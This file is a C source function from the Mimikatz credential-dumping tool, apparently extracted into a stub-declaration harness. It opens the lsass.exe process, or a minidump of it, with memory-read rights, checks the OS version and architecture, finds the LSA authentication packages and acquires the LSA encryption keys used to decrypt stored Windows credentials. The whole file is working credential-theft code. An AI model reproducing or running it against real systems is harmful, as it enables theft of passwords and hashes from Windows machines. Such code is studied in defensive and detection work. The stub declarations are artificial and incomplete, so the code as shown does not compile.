#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_32__   TYPE_9__ ;
typedef  struct TYPE_31__   TYPE_7__ ;
typedef  struct TYPE_30__   TYPE_6__ ;
typedef  struct TYPE_29__   TYPE_5__ ;
typedef  struct TYPE_28__   TYPE_4__ ;
typedef  struct TYPE_27__   TYPE_3__ ;
typedef  struct TYPE_26__   TYPE_2__ ;
typedef  struct TYPE_25__   TYPE_1__ ;
typedef  struct TYPE_24__   TYPE_18__ ;
typedef  struct TYPE_23__   TYPE_17__ ;
typedef  struct TYPE_22__   TYPE_16__ ;
typedef  struct TYPE_21__   TYPE_15__ ;
typedef  struct TYPE_20__   TYPE_14__ ;

/* Type definitions */
struct TYPE_32__ {TYPE_1__* pHandleProcessDmp; } ;
struct TYPE_31__ {int /*<<< orphan*/  (* AcquireKeys ) (TYPE_5__*,int /*<<< orphan*/ *) ;int /*<<< orphan*/  (* initLocalLib ) () ;} ;
struct TYPE_27__ {int /*<<< orphan*/  Informations; } ;
struct TYPE_30__ {TYPE_3__ Module; } ;
struct TYPE_26__ {int MajorVersion; int MinorVersion; scalar_t__ BuildNumber; } ;
struct TYPE_29__ {TYPE_9__* hLsassMem; TYPE_2__ osContext; } ;
struct TYPE_28__ {int MajorVersion; int MinorVersion; scalar_t__ BuildNumber; } ;
struct TYPE_25__ {int /*<<< orphan*/  hMinidump; } ;
struct TYPE_20__ {scalar_t__ isPresent; } ;
struct TYPE_24__ {TYPE_14__ Module; } ;
struct TYPE_23__ {int isValid; } ;
struct TYPE_22__ {TYPE_14__ Module; } ;
struct TYPE_21__ {int isValid; } ;
typedef  TYPE_4__* PMINIDUMP_SYSTEM_INFO ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  scalar_t__ KULL_M_MEMORY_TYPE ;
typedef  scalar_t__ HANDLE ;
typedef  int DWORD ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  CloseHandle (scalar_t__) ; 
 scalar_t__ CreateFile (scalar_t__,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  FILE_SHARE_READ ; 
 int /*<<< orphan*/  GENERIC_READ ; 
 scalar_t__ INVALID_HANDLE_VALUE ; 
 scalar_t__ KULL_M_MEMORY_TYPE_PROCESS ; 
 scalar_t__ KULL_M_MEMORY_TYPE_PROCESS_DMP ; 
 scalar_t__ KULL_M_WIN_MIN_BUILD_8 ; 
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ; 
 int MIMIKATZ_NT_MAJOR_VERSION ; 
 int MIMIKATZ_NT_MINOR_VERSION ; 
 scalar_t__ NT_SUCCESS (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  OPEN_EXISTING ; 
 scalar_t__ OpenProcess (int,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  PRINT_ERROR (char*) ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int PROCESS_QUERY_INFORMATION ; 
 int PROCESS_QUERY_LIMITED_INFORMATION ; 
 int PROCESS_VM_READ ; 
 int /*<<< orphan*/  STATUS_NOT_FOUND ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  SystemInfoStream ; 
 int /*<<< orphan*/  TRUE ; 
 TYPE_5__ cLsass ; 
 int /*<<< orphan*/  kprintf (char*,scalar_t__) ; 
 TYPE_18__ kuhl_m_sekurlsa_dpapi_lsa_package ; 
 int /*<<< orphan*/  kuhl_m_sekurlsa_findlibs ; 
 TYPE_17__ kuhl_m_sekurlsa_livessp_package ; 
 TYPE_16__ kuhl_m_sekurlsa_msv_package ; 
 TYPE_15__ kuhl_m_sekurlsa_tspkg_package ; 
 scalar_t__ kuhl_m_sekurlsa_utils_search (TYPE_5__*,TYPE_14__*) ; 
 TYPE_9__* kull_m_memory_close (TYPE_9__*) ; 
 scalar_t__ kull_m_memory_open (scalar_t__,scalar_t__,TYPE_9__**) ; 
 scalar_t__ kull_m_minidump_stream (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ kull_m_process_getProcessIdForName (char*,int*) ; 
 int /*<<< orphan*/  kull_m_process_getVeryBasicModuleInformations (TYPE_9__*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 TYPE_7__* lsassLocalHelper ; 
 TYPE_7__* lsassLocalHelpers ; 
 TYPE_6__** lsassPackages ; 
 scalar_t__ pMinidumpName ; 
 int /*<<< orphan*/  stub1 () ; 
 int /*<<< orphan*/  stub2 (TYPE_5__*,int /*<<< orphan*/ *) ; 

NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	NTSTATUS status = STATUS_SUCCESS;
	KULL_M_MEMORY_TYPE Type;
	HANDLE hData = NULL;
	DWORD pid;
	PMINIDUMP_SYSTEM_INFO pInfos;
	DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;

	if(!cLsass.hLsassMem)
	{
		status = STATUS_NOT_FOUND;
		if(pMinidumpName)
		{
			Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
			kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
			hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		}
		else
		{
			Type = KULL_M_MEMORY_TYPE_PROCESS;
			if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
				hData = OpenProcess(processRights, FALSE, pid);
			else PRINT_ERROR(L"LSASS process not found (?)\n");
		}

		if(hData && hData != INVALID_HANDLE_VALUE)
		{
			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
			{
				if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
				{
					if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
					{
						cLsass.osContext.MajorVersion = pInfos->MajorVersion;
						cLsass.osContext.MinorVersion = pInfos->MinorVersion;
						cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
					#if defined(_M_X64) || defined(_M_ARM64)
						if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
							PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
					#elif defined(_M_IX86)
						if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
							PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
					#endif
					}
					else
					{
						isError = TRUE;
						PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
					}
				}
				else
				{
				#if defined(_M_IX86)
					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
						PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
					else
				#endif
					{						
						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
					}
				}

				if(!isError)
				{
					lsassLocalHelper = 
					#if defined(_M_ARM64)
						&lsassLocalHelpers[0]
					#else
						(cLsass.osContext.MajorVersion < 6) ? &lsassLocalHelpers[0] : &lsassLocalHelpers[1]
					#endif
					;

					if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
					{
					#if !defined(_M_ARM64)
						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
					#endif
						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
						{
							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
							{
								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
								if(!NT_SUCCESS(status))
									PRINT_ERROR(L"Key import\n");
							}
							else PRINT_ERROR(L"Logon list\n");
						}
						else PRINT_ERROR(L"Modules informations\n");
					}
					else PRINT_ERROR(L"Local LSA library failed\n");
				}
			}
			else PRINT_ERROR(L"Memory opening\n");

			if(!NT_SUCCESS(status))
				CloseHandle(hData);
		}
		else PRINT_ERROR_AUTO(L"Handle on memory");

		if(!NT_SUCCESS(status))
			cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
	}
	return status;
}